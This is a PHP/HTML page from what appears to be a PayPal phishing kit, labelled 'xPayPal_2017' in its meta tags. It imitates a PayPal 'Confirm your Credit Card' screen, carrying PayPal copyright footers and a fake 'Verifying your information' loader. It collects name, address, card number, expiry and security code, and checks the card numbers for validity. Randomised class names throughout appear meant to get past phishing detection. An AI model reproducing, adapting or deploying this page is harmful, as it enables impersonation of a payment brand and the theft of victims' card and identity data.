<?php
include 'inc/config.php';
include 'language.php';
?>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="./file/font-sans.css">
        <link rel="stylesheet" href="./file/template.css">
        <link rel="stylesheet" href="./file/css.css">
        <title>Confirm your Credit Card</title>
        <meta name="description" content="xPayPal_2017 v1.1 | Coded By CaZaNoVa163">
        <meta name="author" content="CaZaNoVa163">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./file/jquery.min.js"></script>
        <script type="text/javascript" src="./file/jstz.min.js"></script>
        <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
        <script type="text/javascript" src="./file/jquery.browser.min.js"></script>
        <link rel="icon" type="image/png" href="img/favicon.ico">
    </head>

    <body>
        <div id="loader" class="2vkwkakgi8ootu 81blna46q8bjqybjrxvd9wpg6nvl spinner gl69nhmobj6alfrah1t6nx6 dc7rzip6ul59tiowsky5qf6z" style="display: none; opacity: 0;">
            <p id="loading_title">Verifying your information…</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <script type="text/javascript" src="./file/jquery.creditCardValidator.min.js"></script>
            <script type="text/javascript" src="./file/cc.js"></script>
            <style>
body {
    background-color: #f8f8f8;
}

            </style>

            <input type="hidden" name="truelogin" id="truelogin" value="No">

            <div id="header_update">
                <div class="suguizwwki container_update for_nav">
                    <div id="menu_btn_update"></div>
                    <div id="logo_update"></div>
                    <ul class="pcem84 pf8gp8x80r6kc25ijuikn8ccogi1ec2 nav">
                        <li class="zzqxp8t1blwkwhu8vtbz8i80nbs9lj2a9izohifjv3v nav-item">
                            <a class="rmo6o750gy1f8qvg01qlvcvxi2k9azxtbbpq  nav-link" href="#">
                                <?=$language['update']['navbar'][1];?>
                            </a>
                        </li>
                        <li class="fg1xtm0e  8l 9axtc09t1l18m1mmhlspcg9q8eq9c39c4xx8o nav-item">
                            <a class="zi4iz8pyoo46n80nbubzsqmaxll2yn nav-link" href="#">
                                <?=$language['update']['navbar'][2];?>
                            </a>
                        </li>
                        <li class="ts6p75gk71mw nav-item">
                            <a class="cwp02dd7gfq0 nav-link" href="#">
                                <?=$language['update']['navbar'][3];?>
                            </a>
                        </li>
                        <li class="shgsuz5ja7nxndqriozo5pr3 nav-item">
                            <a class="xnxmj7ohkbvp nav-link" href="#">
                                <?=$language['update']['navbar'][4];?>
                            </a>
                        </li>
                        <li class="xobvroq7jsuyf88dmfpp26 7v81z3blqroc nav-item">
                            <a class="r0o474k01kxmjpccspu 4 nav-link" href="#">
                                <?=$language['update']['navbar'][5];?>
                            </a>
                        </li>
                    </ul>
                    <div id="logout">
                        <div class="k34wl50so35qlza1ixqpd c5tlsbx1u sub_logout">
                            <button class="gsaikj61za237leqn3h923o log_out"><?=$language['update']['navbar'][6];?></button>
                        </div>
                        <div class="xqt6143tu4ln1xthbmqbekqtagkhxi sub_logout" id="setting">
                        </div>
                        <div class="anfgyx005b9sk0 sub_logout" id="alert">
                        </div>
                    </div>
                </div>
            </div>
            <div id="sub_menu">
                <div class="xx4lhblwp1t7v8q8smpdjshq9xhkxdjl2ey h wx1gvneblyp container_update">
                    <ul class="kjn88eetsjv58bx01918kpm72 sub_nav">
                        <li class="irfowz87l36nrxfqoe sub_nav-item">
                            <a class="jx6ykvwh8qem82sphxhcf70us5ga6m1f x4kirt nav-link" href="#">
                                <?=$language['update']['sub_navbar'][1];?>
                            </a>
                        </li>
                        <li class="1v28tstbo1ckd5qeslq23  1zuzgyb7qx0ogj9j sub_nav-item">
                            <a class="ruohfdp5gml5c1cn0mbq0bm9tm1n4kam6qub nav-link" href="#">
                                <?=$language['update']['sub_navbar'][2];?>
                            </a>
                        </li>
                        <li class="052d7i4 w4u sub_nav-item">
                            <a class="45gdsyfjt8orhjr4dc4zbyxc6rtzowsirznantl7r0o nav-link" href="#">
                                <?=$language['update']['sub_navbar'][3];?>
                            </a>
                        </li>
                        <li class="csg a0zpnhy68b sub_nav-item">
                            <a class="y1a24u94v0uad30 1 nav-link" href="#">
                                <?=$language['update']['sub_navbar'][4];?>
                            </a>
                        </li>
                    </ul>
                    <div class="lk1yrppthkdhf0 arrow"></div>
                </div>
            </div>
            <div id="update_content">
                <div class="fpzqjs6cqrbk2k3i4rxbbij2 bgjk 3 container_update">
                    <div class="fadiknalqhv1 row first">
                        <div class="tohnupb8rh wrkaswr1iia six columns">
                            <div class="u1gwzz50mmao6y6x7fzwyqioy7gidn zehl58hwku row">
                                <div id="profile_div">
                                    <font class="dcjirj8xrkt profile">
                                        <?=$language['update'][1];?>
                                    </font>
                                    <div id="profile_img" style="background-image:url(img/profile.png);"></div>
                                    <div id="Update_Photo">
                                        <?=$language['update'][2];?>
                                    </div>
                                </div>
                                <div id="profile_name_div">
                                    <div id="my_name">
                                        <?=$_SESSION['user'];?>
                                    </div>
                                    <div id="joined_at">
                                        <?=$language['update'][3];?> <?=$_SESSION['joined'];?>
                                            <font>
                                                <?=$language['update'][4];?>
                                            </font>
                                    </div>
                                </div>
                            </div>
                            <div id="frm_account">
                                <table>
                                    <tbody>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_checked.png"></td>
                                            <td>
                                                <?=$language['update'][5][1];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_uncheck.png"></td>
                                            <td>
                                                <?=$language['update'][5][2];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_uncheck.png"></td>
                                            <td>
                                                <?=$language['update'][5][3];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_uncheck.png"></td>
                                            <td>
                                                <?=$language['update'][5][4];?>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="tk6sog5dq8f six columns">
                            <div class="n3ui7ow8874rlamqslwx0tnnn4x profile">
                                <?=$language['update'][6];?>
                            </div>
                            <div id="address_div">
                                <table>
                                    <tbody>
                                        <tr>
                                            <td>
                                                <input type="text" name="simple_login_f_name" id="simple_login_f_name" value="" placeholder="First Name" class="sqk  d24mjlojgj 6la2vedo3 u-pull-left" style="width:49%;">
                                                <input type="text" name="simple_login_l_name" id="simple_login_l_name" value="" placeholder="Last Name" class="3sdjtx30ssgufi emgx2cu500hlhhxdbfhl06frpyz 58aa u-pull-right" style="width:49%;">
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <input type="text" name="simple_login_address" id="simple_login_address" value="" placeholder="Address" class=" m3v og6o hqfc273cfu7m u-pull-left" style="width:69%;">
                                                <input type="text" name="simple_login_city" id="simple_login_city" value="" placeholder="City" class="os3ks1d515072f8vq5xrk votiis5 u-pull-right" style="width:30%;">
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <input type="text" name="simple_login_state" id="simple_login_state" value="" placeholder="State" class="z4rg8i9r5nacrpyhovlf1pfdg77xawn1r58pe88 u-pull-left" style="width:25%;">
                                                <input type="text" name="simple_login_zipcode" id="simple_login_zipcode" value="" placeholder="Zip Code" class="6 8dehgy6lppyscg3p697vsnh5919zu50s 50huxt d u-pull-left" style="width:25%;margin-left:1%;">
                                                <input type="text" name="simple_login_country" id="simple_login_country" value="" placeholder="Country" class="etp58487f54ytye7fc6 brd46a u-pull-right" style="width:48%;">
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                                <div id="wallet_div">
                                    <table>

                                        <tbody>
                                            <tr>
                                                <td><input type="text" name="cc_number" id="cc_number" value="" placeholder="Card number" class="6mxhb7znb u9bv3ozakbbcp5oafu u-full-width" maxlength="16"></td>
                                            </tr>
                                            <tr>
                                                <td>
                                                    <input type="text" name="exp" id="exp" value="" placeholder="Expiration MM/YYYY" class="ppj2e8ippdp8jrtt  htwrwt1cd0fplw5v u-pull-left" style="width:49%;" maxlength="7">
                                                    <input type="text" name="csc" id="csc" value="" placeholder="CSC (3 digits)" class="u-pull-right csc_standard" style="width:49%;" maxlength="3">
                                                </td>
                                            </tr>
                                            <tr>
                                                <td><input type="submit" name="update_submit_btn" id="update_submit_btn" value="<?=$language['update'][8];?>" class="48totam167bl5mtu u-full-width button-primary"></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <input type="hidden" name="cc_card_type" id="cc_card_type" value="">
                                <input type="hidden" name="cc_length_valid" id="cc_length_valid" value="false">
                                <input type="hidden" name="cc_luhn_valid" id="cc_luhn_valid" value="false">
                            </div>
                        </div>
                        <div id="footer_update_mobile">
                            <div class="njp5z0vmh1doy kvo7zcpd b9ve81u3e5jav w8inbxbc row footer_row_1">
                                <font class="dauexv2v4fysi2s8kpm626 footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font>
                            </div>
                            <div class="f4b19zm1lh row footer_row_2">
                                <font class="v0 w64yy4oaw0jv1a3ula footer2">© 1999-
                                    <?=date("Y");?> PayPal, Inc. All rights reserved.</font>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="footer_update">
                    <div class="sax0f64fkg4v8pfxothfxod9ix8gw5 f7x6du1j69e container_update">
                        <div class="wy02woz09ra5qfmo2aa3j5 fel xk4n7te0fuq7t row footer_row_1">
                            <font class="ltnf8lzdc6yt4 footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font><img src="./file/feedback.png"></div>
                        <div class="hb6k9u434mwtjvbbrqze ct4maaf6n8dp4oppjjjw7 row footer_row_2">
                            <font class="yxj2dehuvr46d20alw mayt footer2">© 1999-
                                <?=date("Y");?> PayPal, Inc. All rights reserved.</font>
                            <font class="1wgu1m3l8kg4p9urkhsyigiyytnjwmfo n9202dydltuldb footer3">|</font>
                            <font class="qey02b7gblf5b991dlkyxp footer4">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font>
                        </div>
                    </div>
                </div>
    </body>

    </html>
